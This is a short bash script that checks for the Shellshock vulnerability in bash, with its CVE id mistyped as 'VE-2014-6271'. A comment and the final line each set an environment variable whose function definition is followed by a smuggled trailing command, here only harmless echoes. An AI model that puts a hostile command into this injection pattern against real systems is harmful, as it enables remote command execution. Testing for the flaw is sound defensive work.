#!/bin/bash

# cmd below will output vulnerable if has VE-2014-6271 break
# env x='() { :;}; echo vulnerable' bash -c "echo this is a test"

env -i a='() { echo world;}; echo hello' bash